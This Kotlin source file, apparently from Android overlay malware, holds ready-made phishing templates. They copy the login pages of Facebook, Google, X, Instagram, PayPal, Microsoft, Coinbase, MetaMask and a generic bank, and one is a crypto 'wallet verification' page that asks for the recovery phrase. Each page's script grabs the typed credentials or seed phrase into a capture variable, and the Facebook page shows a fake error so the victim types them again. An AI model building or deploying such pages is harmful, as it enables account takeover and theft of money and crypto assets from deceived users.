// ============================================================
// FILE: android/app/src/main/java/com/xrc/syringe/PhishingPages.kt
// ============================================================
package com.xrc.syringe

/**
 * PhishingPages — HTML templates for phishing overlays.
 *
 * Each template is a self-contained HTML page styled to
 * mimic popular login pages.
 */
object PhishingPages {

    /**
     * Get a phishing HTML template by name.
     */
    fun getTemplate(name: String, targetPackage: String): String {
        return when (name.lowercase()) {
            "facebook", "fb" -> facebookTemplate()
            "google", "gmail" -> googleTemplate()
            "twitter", "x" -> twitterTemplate()
            "instagram", "ig" -> instagramTemplate()
            "bank", "banking" -> bankingTemplate()
            "crypto", "wallet" -> cryptoWalletTemplate()
            "metamask" -> metamaskTemplate()
            "coinbase" -> coinbaseTemplate()
            "paypal" -> paypalTemplate()
            "outlook", "microsoft", "office365" -> microsoftTemplate()
            else -> genericTemplate(name)
        }
    }

    private fun facebookTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px;max-width:400px;width:100%}
.logo{color:#1877f2;font-size:32px;font-weight:bold;text-align:center;margin-bottom:20px}
h2{text-align:center;color:#1c1e21;font-size:18px;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
.footer{text-align:center;margin-top:16px;color:#1877f2;font-size:14px}
.error{color:#e74c3c;font-size:13px;text-align:center;margin:8px 0;display:none}
</style></head><body>
<div class="card">
<div class="logo">facebook</div>
<h2>Log in to Facebook</h2>
<div class="error" id="error">Wrong credentials. Try again.</div>
<form id="loginForm" onsubmit="return capture(event)">
<input type="text" id="email" placeholder="Email address or phone number" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Log In</button>
</form>
<div class="footer"><a href="#">Forgotten password?</a></div>
</div>
<script>
function capture(e){e.preventDefault();
var d={email:document.getElementById('email').value,pass:document.getElementById('pass').value};
if(window.XRC_CAPTURED)window.XRC_CAPTURED=JSON.stringify(d);
else window.XRC_CAPTURED=JSON.stringify(d);
document.getElementById('error').style.display='block';
setTimeout(function(){document.getElementById('email').value='';document.getElementById('pass').value=''},500);
return false;}
</script></body></html>
""".trimIndent()

    private fun googleTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;text-align:center;color:#202124;margin-bottom:8px}
.sub{font-size:16px;text-align:center;color:#5f6368;margin-bottom:32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:8px}
input:focus{border-color:#1a73e8}
button{width:100%;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
button:hover{background:#1557b0}
.clear{clear:both}
</style></head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 75 24"><path fill="#4285F4" d="M67.5 12c0-5.5-3.7-9.2-9-9.2s-9 3.7-9 9.2 3.7 9.2 9 9.2 9-3.7 9-9.2z"/><text x="75" y="18" font-size="18" fill="#5f6368">google</text></svg></div>
<h1>Sign in</h1>
<p class="sub">Use your Google Account</p>
<form id="loginForm" onsubmit="return capture(event)">
<input type="email" id="email" placeholder="Email or phone" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Next</button>
<div class="clear"></div>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={email:document.getElementById('email').value,pass:document.getElementById('pass').value};
if(window.XRC_CAPTURED)window.XRC_CAPTURED=JSON.stringify(d);
else window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun twitterTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
.card{max-width:400px;width:100%;padding:32px}
.logo{font-size:32px;text-align:center;margin-bottom:32px}
h1{font-size:31px;font-weight:bold;margin-bottom:32px}
input{width:100%;padding:16px;background:transparent;border:1px solid #333;border-radius:4px;color:#fff;font-size:17px;margin-bottom:16px;outline:none}
input:focus{border-color:#1d9bf0}
button{width:100%;padding:14px;background:#fff;color:#000;border:none;border-radius:36px;font-size:17px;font-weight:bold;cursor:pointer}
button:hover{background:#ddd}
</style></head><body>
<div class="card">
<div class="logo">𝕏</div>
<h1>Sign in to X</h1>
<form id="loginForm" onsubmit="return capture(event)">
<input type="text" id="username" placeholder="Phone, email, or username" autocomplete="username" required>
<input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Next</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={username:document.getElementById('username').value,password:document.getElementById('password').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun instagramTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{border:1px solid #dbdbdb;border-radius:1px;padding:40px 32px;max-width:350px;width:100%;text-align:center}
.logo{font-family:Georgia,serif;font-size:32px;margin-bottom:24px}
input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;outline:none}
input:focus{border-color:#a8a8a8}
button{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
button:hover{opacity:.8}
.separator{margin:16px 0;border-top:1px solid #dbdbdb}
</style></head><body>
<div class="card">
<div class="logo">Instagram</div>
<form id="loginForm" onsubmit="return capture(event)">
<input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username" required>
<input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Log In</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={username:document.getElementById('username').value,password:document.getElementById('password').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun bankingTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15);padding:24px;max-width:380px;width:100%}
.header{background:#1a237e;color:#fff;padding:16px;margin:-24px -24px 24px;border-radius:8px 8px 0 0;text-align:center;font-size:18px;font-weight:bold}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:12px;outline:none}
input:focus{border-color:#1a237e}
button{width:100%;padding:12px;background:#1a237e;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#283593}
.lock{text-align:center;margin-top:12px;color:#666;font-size:12px}
</style></head><body>
<div class="card">
<div class="header">Online Banking</div>
<form id="loginForm" onsubmit="return capture(event)">
<input type="text" id="userid" placeholder="User ID" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Sign In</button>
</form>
<div class="lock">🔒 Secured by 256-bit encryption</div>
</div>
<script>
function capture(e){e.preventDefault();
var d={userid:document.getElementById('userid').value,pass:document.getElementById('pass').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun cryptoWalletTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px;max-width:420px;width:100%}
.logo{text-align:center;font-size:24px;margin-bottom:16px;color:#58a6ff}
h2{text-align:center;font-size:20px;margin-bottom:8px;color:#f0f6fc}
p{text-align:center;color:#8b949e;font-size:14px;margin-bottom:24px}
textarea{width:100%;padding:12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;min-height:80px;margin-bottom:16px;outline:none;font-family:monospace}
textarea:focus{border-color:#58a6ff}
button{width:100%;padding:14px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#2ea043}
</style></head><body>
<div class="card">
<div class="logo">🔐</div>
<h2>Wallet Security Verification</h2>
<p>Your session expired. Please enter your recovery phrase to restore access.</p>
<form id="seedForm" onsubmit="return capture(event)">
<textarea id="seed" placeholder="Enter your recovery phrase (e.g., word1 word2 word3 ...)"></textarea>
<button type="submit">Verify & Restore</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={seed:document.getElementById('seed').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun metamaskTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'SF Pro',-apple-system,BlinkMacSystemFont,sans-serif}
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.1);padding:32px;max-width:360px;width:100%;text-align:center}
.logo{width:60px;height:60px;background:#e2761b;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;color:#fff;font-size:28px;font-weight:bold}
h2{font-size:22px;margin-bottom:8px;color:#333}
p{font-size:14px;color:#666;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none}
input:focus{border-color:#e2761b}
button{width:100%;padding:14px;background:#e2761b;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#d96a15}
</style></head><body>
<div class="card">
<div class="logo">M</div>
<h2>MetaMask Wallet</h2>
<p>Unlock your wallet</p>
<form id="unlockForm" onsubmit="return capture(event)">
<input type="password" id="password" placeholder="Wallet password" required>
<button type="submit">Unlock</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={password:document.getElementById('password').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun coinbaseTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #eee;border-radius:8px;padding:40px;max-width:400px;width:100%}
.logo{color:#0052ff;font-size:28px;font-weight:bold;text-align:center;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #dcdcdc;border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#0052ff}
button{width:100%;padding:14px;background:#0052ff;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#0045e0}
</style></head><body>
<div class="card">
<div class="logo">Coinbase</div>
<form id="loginForm" onsubmit="return capture(event)">
<input type="email" id="email" placeholder="Email" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Sign In</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={email:document.getElementById('email').value,pass:document.getElementById('pass').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun paypalTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:400px;width:100%;padding:32px}
.logo{color:#003087;font-size:28px;font-weight:bold;text-align:center;margin-bottom:32px;font-style:italic}
input{width:100%;padding:14px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#003087}
button{width:100%;padding:14px;background:#003087;color:#fff;border:none;border-radius:20px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#00246b}
.footer{text-align:center;margin-top:24px;color:#666;font-size:12px}
</style></head><body>
<div class="card">
<div class="logo">PayPal</div>
<form id="loginForm" onsubmit="return capture(event)">
<input type="email" id="email" placeholder="Email or mobile number" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Log In</button>
</form>
<div class="footer">New to PayPal? <a href="#">Sign up</a></div>
</div>
<script>
function capture(e){e.preventDefault();
var d={email:document.getElementById('email').value,pass:document.getElementById('pass').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun microsoftTemplate() = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;padding:44px;max-width:440px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.1)}
.logo{margin-bottom:24px}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:16px;outline:none}
input:focus{border-color:#0067b8}
button{width:100%;padding:12px 24px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer}
button:hover{background:#005da6}
</style></head><body>
<div class="card">
<div class="logo"><svg width="108" height="24"><rect fill="#f25022" width="10" height="10"/><rect fill="#7fba00" x="12" width="10" height="10"/><rect fill="#00a4ef" y="12" width="10" height="10"/><rect fill="#ffb900" x="12" y="12" width="10" height="10"/></svg></div>
<h1>Sign in</h1>
<form id="loginForm" onsubmit="return capture(event)">
<input type="email" id="email" placeholder="Email, phone, or Skype" autocomplete="username" required>
<input type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Sign in</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={email:document.getElementById('email').value,pass:document.getElementById('pass').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()

    private fun genericTemplate(appName: String) = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);padding:32px;max-width:360px;width:100%;text-align:center}
h1{font-size:22px;margin-bottom:8px;color:#333}
p{font-size:14px;color:#666;margin-bottom:24px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:15px;margin-bottom:12px;outline:none}
input:focus{border-color:#666}
button{width:100%;padding:12px;background:#333;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#555}
</style></head><body>
<div class="card">
<h1>$appName</h1>
<p>Please sign in to continue</p>
<form id="loginForm" onsubmit="return capture(event)">
<input type="text" id="username" placeholder="Username or email" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</div>
<script>
function capture(e){e.preventDefault();
var d={username:document.getElementById('username').value,password:document.getElementById('password').value};
window.XRC_CAPTURED=JSON.stringify(d);
return false;}
</script></body></html>
""".trimIndent()
}
